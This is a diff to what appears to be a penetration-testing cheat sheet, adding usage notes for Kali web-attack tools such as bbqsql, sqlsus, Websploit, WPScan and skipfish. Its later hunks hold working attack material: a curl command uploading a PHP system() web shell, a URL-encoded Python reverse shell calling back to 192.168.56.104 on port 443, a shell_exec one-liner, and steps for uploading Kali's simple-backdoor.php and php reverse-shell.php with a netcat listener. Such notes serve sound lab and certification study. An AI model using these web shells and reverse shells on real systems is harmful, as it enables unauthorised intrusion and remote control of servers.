@@ -1281,25 +1281,88 @@ wafw00f http://www.example.net
 
 ### BBSQL
 
-### HTTRACK
+A blind sql injection framework
+
+bbqsql -h
+
+### HTTrack
+
+httrack *target-domain* --mirror-wizard
 
 ### PAROS
+
+type "paros"
+
+go to Tools > options > local proxy to view proxy settings. 
+
+set iceweasel network connection proxy to same as paros
+
+### spider with paros
+
+right click and spider
+
+### scan with paros
+
+from the tool menu elect analyze > click scan > view report
 
 ### powerfuzzer
 
 ### SKIPFISH
 
+web application security recon tool
+
+skipfish -o skipfishdata *target-domain*
+
+view report by browsing to index.html
+
 ### SklNinja
+
+sqlninja -h
+
+### SqlSUS
+
+MYSQL injection tool
+
+generate config file by typing 
+
+```
+sqlsus -g config.cfg
+```
+Edit config.cfg 
+
+start the command shell environment
+
+```
+sqlsus config.cfg
+```
+enter help to get a list of commands
+
+type *start* to begin testing
 
 ### Websploit
 
+use [modulename]
+
+show options
+
+set [options] [value]
+
+example with the PHPmyadmin login page scanner
+
+1. type "use web/pma"
+2. then stype "show options"
+3. lastly "set *target*"
+4. now "run" the module
+
 ### WPScan
+
+wpscan -url *target-domain*
 
 ### PARSERO
 
 Curl *target*/robots.txt -s | html2text
 
-parsero -u 10.11.1.71
+parsero -u *target*
 
 ### Web Application (Accessing The Source Code)
 
@@ -1560,6 +1623,17 @@ curl -X PUT -d '<?php system(*dollar-sign*_GET["c"]);' http://*target*1.php
 ```
 curl "http://*target*/test/1.php?c=python+-c+%27import+socket%2csubprocess%2cos%3bs%3dsocket.socket(socket.AF_INET%2csocket.SOCK_STREAM)%3bs.connect((%22192.168.56.104%22%2c443))%3bos.dup2(s.fileno()%2c0)%3b+os.dup2(s.fileno()%2c1)%3b+os.dup2(s.fileno()%2c2)%3bp%3dsubprocess.call(%5b%22%2fbin%2fsh%22%2c%22-i%22%5d)%3b%27"
 ```
+### kali included webshells
+
+/usr/share/webshells
+
+simply upload the "simple-backdoor.php file and then pass commands to it via
+
+```
+*target*/shells/simple-backdoor.php?cmd=ls
+```
+Bellow are some examples of what commands could be possible with command injection via simple-backdoor.php?cmd=
+
 
 ```
 <?php echo shell_exec(*dollar-sign*_GET['cmd']);?>
@@ -1597,7 +1671,13 @@ proof of concept below
 
 ```
 
+### php reverse-shell.php
 
+Edit the shell and put in your local kali ip address and port
+
+start netcat listener and just surf to the reverse-shell.php
+
+you may have to upload it with special characters such as ; or other special characters
 
 
 
